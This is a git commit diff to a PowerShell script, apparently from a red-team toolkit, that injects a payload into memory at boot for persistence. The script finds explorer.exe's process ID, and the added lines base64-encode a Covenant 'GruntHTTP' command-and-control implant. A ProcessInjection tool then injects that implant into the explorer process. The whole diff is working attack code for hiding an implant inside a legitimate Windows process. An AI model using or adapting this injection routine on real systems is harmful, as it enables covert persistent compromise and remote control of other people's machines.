4f67b914330c81b0ffd4874c04dceb0cd87a03ea
megatop1 <43348736+megatop1@users.noreply.github.com>
2022-01-18 22:18:53 -0500

    Update InjectPayloadtoMemoryOnboot.ps1

--- Windows/Persistence/InjectPayloadtoMemoryOnboot.ps1
+++ Windows/Persistence/InjectPayloadtoMemoryOnboot.ps1
@@ -1,6 +1,10 @@
 # Get PID of first occurence of explorer.exe
 $procid=(get-process explorer).id | Select-Object -First 1
 
+# Create .txt payload
+$filename = "C:\Users\Administrator\Downloads\GruntHTTP.bin"
+[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | Out-File C:\Users\Downloads\covenant.txt
+
 # Inject Payload into Memory
 C:\Users\Administrator\ProcessInjection\ProcessInjection\bin\Debug\ProcessInjection.exe /pid:$procid /path:C:\Users\Administrator\Downloads\covenant.txt /f:base64 /t:1
 
